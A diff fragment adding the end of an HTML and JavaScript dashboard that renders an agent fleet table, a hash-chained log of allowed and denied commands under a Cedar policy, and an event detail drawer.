+            <span class="px-2 py-0.5 rounded text-[10px] font-bold ${isRevoked ? 'bg-rose-500/10 text-rose-400 border border-rose-500/30' : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'}">
+              ${f.status.toUpperCase()}
+            </span>
+          </td>
+          <td class="px-4 py-3 font-mono text-slate-400 truncate max-w-xs" title="${f.binary_hash}">${f.binary_hash.substring(0, 16)}...</td>
+          <td class="px-4 py-3 text-slate-400">${f.last_heartbeat}</td>
+        `;
+        tbody.appendChild(tr);
+      });
+    }
+
+    function renderFleetTableWithData(agents) {
+      const tbody = document.getElementById("fleet-table-body");
+      if (!tbody || !agents || agents.length === 0) return;
+      tbody.innerHTML = "";
+      agents.forEach(a => {
+        const isRevoked = a.status === "revoked";
+        const isDereg = a.status === "deregistered" || a.status === "inactive";
+        const tr = document.createElement("tr");
+        tr.className = isDereg ? "hover:bg-slate-800/50 opacity-60" : "hover:bg-slate-800/50";
+        const lastHb = a.last_heartbeat_at ? new Date(a.last_heartbeat_at).toLocaleTimeString() : (isDereg ? "Session Closed" : "Active (Alive)");
+        const hashDisplay = a.binary_hash ? (a.binary_hash.substring(0, 16) + "...") : "verified-binary";
+        const badgeColor = isRevoked ? 'bg-rose-500/10 text-rose-400 border border-rose-500/30' : isDereg ? 'bg-slate-800 text-slate-400 border border-slate-700' : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30';
+        tr.innerHTML = `
+          <td class="px-4 py-3 font-mono text-slate-200 font-medium">${escapeHtml(a.agent_id)}</td>
+          <td class="px-4 py-3 font-semibold text-cyan-400">${escapeHtml(a.app_id || a.agent_name)}</td>
+          <td class="px-4 py-3 font-mono text-slate-300">${escapeHtml(a.instance_id || 'default')}</td>
+          <td class="px-4 py-3 font-mono text-purple-300 font-semibold">${escapeHtml(a.spiffe_id || 'N/A')}</td>
+          <td class="px-4 py-3">
+            <span class="px-2 py-0.5 rounded text-[10px] font-bold ${badgeColor}">
+              ${(isDereg ? "DEREGISTERED" : (a.status || "active")).toUpperCase()}
+            </span>
+          </td>
+          <td class="px-4 py-3 font-mono text-slate-400 truncate max-w-xs" title="${escapeHtml(a.binary_hash || '')}">${hashDisplay}</td>
+          <td class="px-4 py-3 text-slate-400">${lastHb}</td>
+        `;
+        tbody.appendChild(tr);
+      });
+    }
+
+    // --- HASH CHAIN VISUALIZER ---
+    function renderHashChain() {
+      const container = document.getElementById("hash-chain-visualizer");
+      container.innerHTML = "";
+
+      currentEvents.forEach((ev, idx) => {
+        const isDeny = ev.decision === "deny";
+        const block = document.createElement("div");
+        block.className = "p-3 bg-slate-900 border border-slate-800 rounded-lg flex items-center space-x-3";
+        block.innerHTML = `
+          <div class="px-2 py-1 rounded bg-slate-950 text-cyan-400 font-bold text-xs">Block #${idx + 1}</div>
+          <div class="flex-1 truncate">
+            <span class="text-slate-500">Event:</span> <strong class="${isDeny ? 'text-rose-400' : 'text-emerald-400'}">${ev.decision.toUpperCase()}</strong>
+            <span class="text-slate-500 ml-2">Cmd:</span> <code class="text-slate-300">${escapeHtml(ev.full_command || ev.executable)}</code>
+          </div>
+          <div class="text-[11px] text-slate-400 truncate max-w-xs">
+            <span>Hash: </span><span class="text-cyan-300 font-bold">${ev.hash ? ev.hash.substring(0, 18) + '...' : 'SHA256-LINKED'}</span>
+          </div>
+        `;
+        container.appendChild(block);
+      });
+    }
+
+    // --- DRAWER OPEN/CLOSE ---
+    function openDrawer(ev) {
+      const isDeny = ev.decision === "deny";
+      const badge = document.getElementById("detail-badge-decision");
+      badge.textContent = ev.decision.toUpperCase();
+      badge.className = `px-2 py-0.5 rounded text-[10px] font-bold ${isDeny ? 'bg-rose-500/20 text-rose-400 border border-rose-500/40' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'}`;
+
+      document.getElementById("detail-event-id").textContent = ev.id || "ev-live";
+      document.getElementById("detail-timestamp").textContent = ev.timestamp || new Date().toISOString();
+      document.getElementById("detail-source").textContent = ev.source || "claude-code";
+      document.getElementById("detail-executable").textContent = ev.executable || "unknown";
+      document.getElementById("detail-pid").textContent = ev.client_pid || "24000";
+      document.getElementById("detail-duration").textContent = (ev.duration_ms || 1) + "ms";
+      document.getElementById("detail-command").textContent = ev.full_command || ev.executable;
+      document.getElementById("detail-reason").textContent = ev.reason || (isDeny ? "Denied by Cedar policy" : "Permitted by Cedar policy");
+      document.getElementById("detail-prev-hash").textContent = ev.prev_hash || "genesis-bapltd-control-plane";
+      document.getElementById("detail-event-hash").textContent = ev.hash || "a59b34f892c01928374910293847561029384756";
+      document.getElementById("detail-raw-json").textContent = JSON.stringify(ev, null, 2);
+
+      detailDrawer.classList.remove("translate-x-full");
+    }
+
+    function closeDrawer() {
+      detailDrawer.classList.add("translate-x-full");
+    }
+
+    function escapeHtml(str) {
+      if (!str) return "";
+      return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+    }
+
+    // Run on load
+    window.addEventListener("DOMContentLoaded", init);
+  </script>
+</body>
+</html>
+
